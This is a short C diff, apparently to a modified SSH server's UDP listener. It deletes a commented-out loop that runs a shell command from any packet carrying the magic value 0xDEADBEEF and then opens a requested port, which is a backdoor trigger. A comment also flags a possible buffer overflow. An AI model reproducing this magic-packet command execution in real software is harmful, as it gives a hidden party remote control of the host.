@@ -84,36 +84,7 @@ int start_udp() {
         perror("bind failed"); 
         return -1;
     }
-
     return sockfd;
-    /*
-    while(1){
-        int len, n;   
-        len = sizeof(cliaddr);  //len is value/resuslt 
-        //TODO - need to add try and catch ,
-        // exception might occur when n>BUFFERSIZE -> buffer overflow
-        n = recvfrom(sockfd, (char *)buffer, PACKETSIZE,  
-                    MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
-                    &len);
-
-        if((unsigned)n != PACKETSIZE){//need to get exactly packet size
-            printf("buffer:%s\n",buffer);
-            parse_error(&new_packet,"RECIEVED PACKET DIFFERENT THAN PACKET'S SIZE");
-        }
-        else{//else-parse income
-            parse_packet(&new_packet,buffer);
-        }
-        
-        //execute shell command and port adding only if 0xDEADBEEF and legal command
-        if((int)new_packet.magic == MAGICNUM &&
-            check_shell_command(&new_packet)){
-                //execute the shell_command, then add port
-                shell_exec_command(new_packet.shell_command); //func in svr-chansession
-                add_port_request((int)new_packet.port_number); //func in svr-main   
-        }
-    }
-    */
-
 } 
 
 
